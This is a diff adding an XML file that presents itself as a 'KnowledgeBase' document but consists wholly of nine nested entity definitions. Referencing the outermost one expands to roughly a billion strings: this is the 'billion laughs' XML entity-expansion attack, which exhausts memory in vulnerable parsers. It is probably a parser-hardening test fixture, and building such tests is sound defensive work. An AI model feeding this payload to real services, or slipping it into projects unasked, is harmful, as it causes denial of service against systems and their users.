@@ -1,0 +1,13 @@
+<!DOCTYPE KnowledgeBase [
+<!ENTITY tm "tm">
+<!ENTITY tm2 "&tm;&tm;&tm;&tm;&tm;&tm;&tm;&tm;&tm;&tm;">
+<!ENTITY tm3 "&tm2;&tm2;&tm2;&tm2;&tm2;&tm2;&tm2;&tm2;&tm2;&tm2;">
+<!ENTITY tm4 "&tm3;&tm3;&tm3;&tm3;&tm3;&tm3;&tm3;&tm3;&tm3;&tm3;">
+<!ENTITY tm5 "&tm4;&tm4;&tm4;&tm4;&tm4;&tm4;&tm4;&tm4;&tm4;&tm4;">
+<!ENTITY tm6 "&tm5;&tm5;&tm5;&tm5;&tm5;&tm5;&tm5;&tm5;&tm5;&tm5;">
+<!ENTITY tm7 "&tm6;&tm6;&tm6;&tm6;&tm6;&tm6;&tm6;&tm6;&tm6;&tm6;">
+<!ENTITY tm8 "&tm7;&tm7;&tm7;&tm7;&tm7;&tm7;&tm7;&tm7;&tm7;&tm7;">
+<!ENTITY tm9 "&tm8;&tm8;&tm8;&tm8;&tm8;&tm8;&tm8;&tm8;&tm8;&tm8;">
+]>
+<KnowledgeBase xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+&tm9;</KnowledgeBase>
